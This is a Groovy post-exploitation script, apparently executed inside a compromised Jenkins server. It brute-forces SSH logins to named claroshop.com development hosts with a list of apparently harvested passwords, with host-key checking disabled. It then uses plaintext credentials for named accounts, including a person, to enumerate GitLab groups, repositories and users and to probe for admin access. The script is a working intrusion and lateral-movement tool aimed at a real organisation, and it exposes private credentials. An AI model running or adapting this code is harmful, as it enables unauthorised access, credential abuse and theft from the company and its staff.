// MICRO-AB: JSch SSH into deployment servers + GitLab group projects
import com.jcraft.jsch.*

def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(3000)
}

// JSch helper
def sshExec = { host, user, pass, cmd ->
    try {
        def jsch = new JSch()
        def session = jsch.getSession(user, host, 22)
        session.setPassword(pass)
        def config = new java.util.Properties()
        config.put("StrictHostKeyChecking", "no")
        config.put("PreferredAuthentications", "password")
        session.setConfig(config)
        session.connect(8000)
        def channel = session.openChannel("exec")
        ((ChannelExec) channel).setCommand(cmd)
        def out2 = new ByteArrayOutputStream()
        channel.setOutputStream(out2)
        channel.connect(5000)
        Thread.sleep(6000)
        channel.disconnect()
        session.disconnect()
        return out2.toString().take(3000)
    } catch(e) {
        return "SSH_FAIL: ${e.message?.take(200)}"
    }
}

println "=== JSch SSH Tests ==="
def hosts = ["CSDEV01-2.dev.claroshop.com", "CSDEV01-1.dev.claroshop.com"]
def passwords = [
    "e6LBqIkOI\$PR1XX2oia",   // jenkins gitlab pass
    "JenkisLegasy25",           // jenkins_legacy
    "FtMRl4fDXzIDY4Yj",         // maria.policarpo
    "jenkins",
    "jenkins123",
]
passwords.each { pw ->
    def r = sshExec("CSDEV01-2.dev.claroshop.com", "jenkins", pw, "whoami")
    println "  jenkins@CSDEV01-2 pw='${pw.take(15)}' => ${r.take(100)}"
}

println "\n=== GitLab Group Projects via jq ==="
def groups = ["claroshop", "caja", "sears", "t1", "claro-pay", "claropay"]
groups.each { grp ->
    def r = run("curl -sk -u 'maria.policarpo:FtMRl4fDXzIDY4Yj' 'https://gitlab.dev.claroshop.com/api/v4/groups/${grp}/projects?per_page=50' | jq -r '.[]|\"\\(.id) \\(.path_with_namespace) \\(.http_url_to_repo)\"' 2>/dev/null || curl -sk -u 'maria.policarpo:FtMRl4fDXzIDY4Yj' 'https://gitlab.dev.claroshop.com/api/v4/groups/${grp}/projects?per_page=50' | grep -o '\"path_with_namespace\":\"[^\"]*\"' | head -20")
    println "GROUP ${grp}: " + r.take(500)
}

println "\n=== GitLab All Projects (raw JSON parse) ==="
def allProjects = run("curl -sk -u 'jenkins:e6LBqIkOI\$PR1XX2oia' 'https://gitlab.dev.claroshop.com/api/v4/projects?per_page=100&page=1' | grep -o '\"path_with_namespace\":\"[^\"]*\"' | head -30")
println "jenkins projects: " + allProjects.take(1000)

def allProjects2 = run("curl -sk -u 'maria.policarpo:FtMRl4fDXzIDY4Yj' 'https://gitlab.dev.claroshop.com/api/v4/projects?per_page=100&page=1&with_issues_enabled=true' | grep -o '\"path_with_namespace\":\"[^\"]*\"' | head -30")
println "maria projects: " + allProjects2.take(1000)

println "\n=== Try GitLab admin API (are we admin?) ==="
def adminCheck = run("curl -sk -u 'maria.policarpo:FtMRl4fDXzIDY4Yj' 'https://gitlab.dev.claroshop.com/api/v4/users?active=true&per_page=10' | grep -o '\"username\":\"[^\"]*\"' | head -10")
println "Users API (admin only): " + adminCheck.take(500)

println "=== DONE MICRO-AB ==="
